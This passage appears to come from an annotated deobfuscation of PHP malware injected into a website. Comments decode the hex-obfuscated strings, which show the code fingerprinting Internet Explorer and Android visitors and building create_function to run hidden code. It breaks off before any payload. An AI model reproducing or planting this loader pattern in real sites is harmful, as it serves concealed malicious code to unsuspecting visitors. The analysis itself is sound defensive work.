...
// echo "\x6f\142\x5f\163\x74\141\x72\164"; // ob_start
// echo "\x61\156\x75\156\x61"; // anuna

if( ( function_exists( "\x6f\142\x5f\163\x74\141\x72\164" ) && ( !isset( $GLOBALS["\x61\156\x75\156\x61"]) ) ) ) { 
    
    $GLOBALS["\x61\156\x75\156\x61"] = 1; 
    
    $uas = strtolower( $_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"] ); 
    
    // echo "\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"; // HTTP_USER_AGENT 
    
    if( ( strstr( $uas, "\x6d\163\x69\145" ) ) or ( strstr( $uas, "\x72\166\x3a\61\x31" ) ) or ( strstr ( $uas, "\x61\156\x64\162\x6f\151\x64" ) ) ) { 
        
        // echo "\x6d\163\x69\145"; // msie
        // echo "\x72\166\x3a\61\x31"; // rv:11
        // echo "\x61\156\x64\162\x6f\151\x64"; // android
        
        $lsfpkoa = "\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e";
        
        // echo "\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; // create_function
